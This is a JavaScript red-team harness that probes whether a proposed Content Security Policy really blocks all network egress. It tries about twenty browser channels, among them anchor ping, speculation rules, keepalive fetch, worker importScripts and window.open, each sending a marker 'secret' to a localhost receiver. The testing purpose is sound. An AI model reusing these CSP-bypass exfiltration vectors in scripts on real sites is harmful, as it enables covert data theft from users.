// Red-team round 2: exfiltration mechanisms the first harness never attempted.
//
// The published claim is "no subresource or background network egress ... across every
// mechanism CSP governs". That claim is only as good as the vector list, and the first
// list was 16 mechanisms chosen by the same person who wrote the policy. These are the
// ones that list missed, several of which are governed by directives the proposed policy
// does not set at all.
//
// Every vector carries the marker BILLTEXT so the receiving server can attribute it.
window.__tryAll2 = async function (tag) {
  const U = (v) => `http://127.0.0.1:8973/${tag}-${v}?secret=BILLTEXT`;
  const out = [];
  const t = async (name, fn) => {
    try {
      await fn();
      out.push(name + ":attempted");
    } catch (e) {
      out.push(name + ":threw(" + e.name + ")");
    }
  };

  // <a ping> -- governed by connect-src, but frequently forgotten.
  await t("anchorping", () => {
    const a = document.createElement("a");
    a.href = "#";
    a.ping = U("ping");
    document.body.appendChild(a);
    a.click();
  });

  // Speculation Rules -- prefetch/prerender a cross-origin URL. Governed by
  // `script-src` for the rule block itself, and by default-src/prefetch-src for the
  // fetch. A policy written before this API existed will not mention it.
  await t("speculationrules", () => {
    const s = document.createElement("script");
    s.type = "speculationrules";
    s.textContent = JSON.stringify({ prefetch: [{ source: "list", urls: [U("speculation")] }] });
    document.head.appendChild(s);
  });

  // Resource hints. `prefetch-src` was removed from CSP; these fall back to default-src
  // in some engines and to nothing in others.
  for (const rel of ["prefetch", "preload", "dns-prefetch", "preconnect"]) {
    await t("link-" + rel, () => {
      const l = document.createElement("link");
      l.rel = rel;
      l.href = U("link-" + rel);
      if (rel === "preload") l.as = "fetch";
      document.head.appendChild(l);
    });
  }

  // <object> / <embed> -- object-src.
  await t("object", () => {
    const o = document.createElement("object");
    o.data = U("object");
    document.body.appendChild(o);
  });
  await t("embed", () => {
    const e = document.createElement("embed");
    e.src = U("embed");
    document.body.appendChild(e);
  });

  // Media -- media-src, which the proposed policy does not set (default-src covers it,
  // but only if default-src is actually 'none').
  await t("video", () => {
    const v = document.createElement("video");
    v.src = U("video");
    v.autoplay = true;
    document.body.appendChild(v);
    v.load();
  });
  await t("track", () => {
    const v = document.createElement("video");
    const tr = document.createElement("track");
    tr.src = U("track");
    tr.kind = "subtitles";
    tr.default = true;
    v.appendChild(tr);
    document.body.appendChild(v);
  });

  // SVG external references.
  await t("svgimage", () => {
    document.body.insertAdjacentHTML(
      "beforeend",
      `<svg><image href="${U("svgimage")}" width="4" height="4"/></svg>`,
    );
  });
  await t("svguse", () => {
    document.body.insertAdjacentHTML(
      "beforeend",
      `<svg><use href="${U("svguse")}#x"/></svg>`,
    );
  });

  // CSS background-image -- img-src.
  await t("cssbg", () => {
    const s = document.createElement("style");
    s.textContent = `.bgx{background-image:url("${U("cssbg")}")}`;
    document.head.appendChild(s);
    const d = document.createElement("div");
    d.className = "bgx";
    d.textContent = ".";
    document.body.appendChild(d);
  });

  // fetch with keepalive -- survives page teardown, the classic exfil-on-unload trick.
  await t("keepalive", () => fetch(U("keepalive"), { mode: "no-cors", keepalive: true }));

  // WebTransport -- HTTP/3; governed by connect-src.
  await t("webtransport", () => {
    if (typeof WebTransport === "undefined") throw new DOMException("n/a", "NotSupportedError");
    new WebTransport("https://127.0.0.1:8973/" + tag + "-webtransport");
  });

  // importScripts from inside a worker (distinct from the worker's own fetch).
  await t("importscripts", () => {
    const src = `try{importScripts("${U("importscripts")}")}catch(e){}`;
    const w = new Worker(URL.createObjectURL(new Blob([src], { type: "text/javascript" })));
    setTimeout(() => w.terminate(), 1200);
  });

  // <iframe srcdoc> containing its own loader -- the child inherits the parent policy,
  // which is exactly the assumption worth testing rather than assuming.
  await t("iframesrcdoc", () => {
    const f = document.createElement("iframe");
    f.srcdoc = `<img src="${U("srcdoc")}">`;
    document.body.appendChild(f);
  });

  // window.open -- a new browsing context is NOT a subresource, so CSP does not cover it.
  // Recorded to show the boundary of the claim rather than to suggest it is blocked.
  await t("windowopen", () => {
    const w = window.open(U("windowopen"), "_blank");
    if (w) setTimeout(() => w.close(), 900);
  });

  // meta refresh -- top-level navigation, also outside CSP. Injected into a child frame
  // so it does not navigate this page away.
  await t("metarefresh", () => {
    const f = document.createElement("iframe");
    f.srcdoc = `<meta http-equiv="refresh" content="0;url=${U("metarefresh")}">`;
    document.body.appendChild(f);
  });

  await new Promise((r) => setTimeout(r, 3000));
  return out.join("\n");
};
